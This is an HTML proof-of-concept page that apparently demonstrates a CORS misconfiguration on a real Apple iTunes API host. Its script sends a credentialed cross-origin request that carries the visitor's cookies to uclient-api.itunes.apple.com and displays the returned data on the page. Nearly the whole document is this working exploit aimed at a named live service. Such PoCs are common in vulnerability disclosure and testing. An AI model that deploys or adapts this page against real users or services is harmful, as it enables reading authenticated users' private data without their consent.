<!DOCTYPE html>
<html>
<head>
    <title>CORS Exploit PoC</title>
</head>
<body>
    <h1>CORS Exploit Proof of Concept</h1>
    <p>This PoC demonstrates the CORS misconfiguration. The server reflects the Origin header, allowing any domain to interact with the API.</p>
    <button id="exploitBtn">Send Request</button>
    <pre id="response">Click the button to test the vulnerability.</pre>

    <script>
        document.getElementById('exploitBtn').addEventListener('click', () => {
            fetch('https://uclient-api.itunes.apple.com', {
                method: 'GET',
                credentials: 'include' // Include cookies or authentication tokens
            })
            .then(response => response.text())
            .then(data => {
                document.getElementById('response').textContent = data;
            })
            .catch(err => {
                document.getElementById('response').textContent = 'Error: ' + err;
            });
        });
    </script>
</body>
</html>
